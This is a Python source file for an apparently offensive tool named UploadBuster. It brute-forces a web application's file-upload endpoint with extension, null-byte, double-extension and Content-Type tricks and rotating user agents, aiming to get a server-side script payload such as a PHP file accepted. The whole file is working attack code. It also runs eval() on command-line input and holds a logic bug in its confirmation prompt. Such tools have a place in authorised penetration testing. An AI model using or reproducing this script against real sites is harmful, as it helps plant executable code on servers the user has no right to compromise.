from random import randint
import requests
import json
import argparse
from time import sleep


def args_handler():
    parser = argparse.ArgumentParser()

    # values
    parser.add_argument("-u", "--url", help="Full url to the upload script i.e site.com/upload.php", required=True)
    parser.add_argument("-b", "--backend", help="The backend language of the website [php,jsp,asp]", required=True)
    parser.add_argument("-e", "--extensions", help="The allowed extensions of the website [jpeg,docx,png,pdf]", required=True)
    parser.add_argument("-a", "--all-tests", help="Make the full test of insecure file upload on target", action='store_true')
    parser.add_argument("-p", "--payload", default="PAYLOAD.php",help="Payload to sent, default: the preferred language hello script if not provided the script will be <?php echo HelloWorld;?>")
    parser.add_argument("-s", "--success", default="success",help='The success message of the upload script. `Upload was successful! link: site.com/payload.php`')
    parser.add_argument("-d", "--data", default=0, help='Add custom data to the request')
    parser.add_argument("-uv", "--upload-variable", default="file", help='main page upload php form variable (i.e form-data; name:###')
    parser.add_argument("-c", "--headers", help='Add custom headers to the request')
    parser.add_argument("-i", "--intervals", default=0, help='Add a delay between requests.')

    # modes
    parser.add_argument("-be", "--bruteforce-extension", help='Extension Brute forcing. ')
    parser.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ')
    parser.add_argument("-de", "--double-extension", default=0, help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-de [3] = jpg.php.php.php) ')
    parser.add_argument("-db", "--dont-brute", action='store_true', help='is success message is found stop the brute force. ')

    # print args
    parser.add_argument("--print-i", help="print the Request", action='store_true')
    parser.add_argument("--print-o", help="print the Response", action='store_true')
    parser.add_argument("-v", "--print", action='store_true', help='full data of the request')
    parser.add_argument("-vs", "--verbal-success", action='store_false', help='Turn off success message [switch]')


    return parser.parse_args()


class UploadBuster:

    def __init__(self):
        # import configuration
        with open('json.json') as file:
            self._configuration = json.load(file)

        # args object
        self.args = args_handler()
        self.target_url = self.args.url
        self.payload_file_name = self.args.payload
        self.backend_tech = self.args.backend
        self.allowed_exts = self.args.extensions.split()
        self.success_message = self.args.success
        self._delay = self.args.intervals

        # request data
        self._headers = dict()
        self.request_file_name = self.payload_file_name
        self.p1 = self.request_file_name # request file name
        self.p2 = self.allowed_exts[0] # request file extension
        self.payload = dict()
        self.payload.update({self.args.upload_variable: (self.p1.split('.')[0]+"."+self.p2, open(self.payload_file_name, 'rb').read(), 'multipart/form-data')})
        self._content_type = None
        self._user_agent = None
        self.auth = {}
        self._ext_len = int()
        self.request = None  # request object
        self.submit = dict()
        self._test_payload = '<?php echo HelloWorld;?>'

        # banks
        self.temp_file_name_bank = []
        self.temp_content_type_bank = []

    # techs

    def _tech_rand_user_agent(self):
        self._user_agent = {"user-agent": self._configuration['config']['user-agents'][randint(0, 2)]}
        self._headers.update(self._user_agent)

    def _tech_ext_raw(self):
        for ext in self._configuration['exts'][self.backend_tech]:
            temp_file_name = self.payload_file_name[:-self._ext_len] + ext
            self.temp_file_name_bank.append(temp_file_name)

    def _tech_ext_null(self):
        for ext in self._configuration['exts']['null']:
            temp_file_name = self.payload_file_name[:-self._ext_len] + ext
            self.temp_file_name_bank.append(temp_file_name)

    def _tech_content_type(self, _random_flag=False):
        for content_type in self._configuration['content_types']:
            self.temp_content_type_bank.append(content_type)
        if _random_flag:
            return self.temp_content_type_bank[randint(1, len(self.temp_content_type_bank))]
        if not _random_flag:
            self._content_type = self.temp_content_type_bank[1]

    # back

    def _if_success(self):
        if self.success_message.lower() in self.request.text.lower():
            return True
        else:
            return False

    def _get_ext_len(self):
        self.ext_len = len(self.args.payload.split(".")[-1])+1

    def _add_submit_button(self):
        self.submit = eval(self.args.data)

    def _refresh_format(self, _original=False):
        if _original:
            self.p1 = self.request_file_name
            self.p2 = self.allowed_exts[0]
        self.payload.update({self.args.upload_variable:(self.p1.split('.')[0]+"."+self.p2, open(self.payload_file_name, 'rb').read(), 'multipart/form-data')})
        # if len(self.args.data) > 0:
        self._add_submit_button()

    # bruters

    def brut_ext(self):
        self._refresh_format(_original=True)
        for self.p2 in self.temp_file_name_bank + self.allowed_exts:
            self._refresh_format()
            self._send_post_request()
            self._if_success()
            self._print_init()

    def brut_double_ext(self):
        self._refresh_format(_original=True)
        for self.p2 in self.allowed_exts:
            _p2_org = self.p2
            for _ptemp in self.temp_file_name_bank:
                for _EMPTY in range(int(self.args.double_extension)):
                    _ptemp = _ptemp + _ptemp
                    self.p2 = _p2_org + _ptemp
                    self._refresh_format()
                    self._send_post_request()
                    self._if_success()
                    self._print_init()


    def brut_content_type(self):
        self._refresh_format(_original=True)
        for _content_type in self.temp_content_type_bank:
            self._refresh_format()
            self._headers.update({'content-type': _content_type})
            self._send_post_request()
            self._if_success()
            self._print_init()

    def _print_init(self):
        if self.args.print_i:
            print(f'POST {self.target_url}\n{self._headers}\n{self.payload} ')
        if self.args.print_o:
            print(f'POST {self.target_url}\n{self.request.headers}\n{self.request.text} ')
        if self.args.print:
            print(f'''> Payload:
        > URL: {self.target_url}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > HEADERS: {self._headers}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > FILE: {self.payload}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > DATA: {self.args.data}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        ''')
        if self.args.verbal_success and self._if_success() == True:
            print(f'[+] Success message found!')

        if self.args.dont_brute:
            if input('Continue: ') == 'y' or 'Y':
                quit()


    def _send_post_request(self):
        with open(self.payload_file_name, 'r') as _file:
            sleep(self._delay)
            self.request = requests.post(self.target_url, headers=self._headers, files=self.payload, data=self.submit, timeout=3, auth=self.auth, allow_redirects=True)
            self._print_init()

    def main(self):
        def main_init():
            try:
                if len(self.args.headers) > 1:
                    self._headers.update(eval(self.args.headers))
            except NameError and TypeError as E:
                self._headers = {}
                pass
            self._refresh_format(_original=False)
            self._tech_ext_raw()
            self._tech_ext_null()
            self._get_ext_len()
            self._tech_content_type()
            self._tech_content_type()
            self._tech_rand_user_agent()


        main_init()
        self.brut_ext()
        self.brut_double_ext()
        self.brut_content_type()

        # self._send_post_request()


if __name__ == '__main__':
    UploadBuster().main()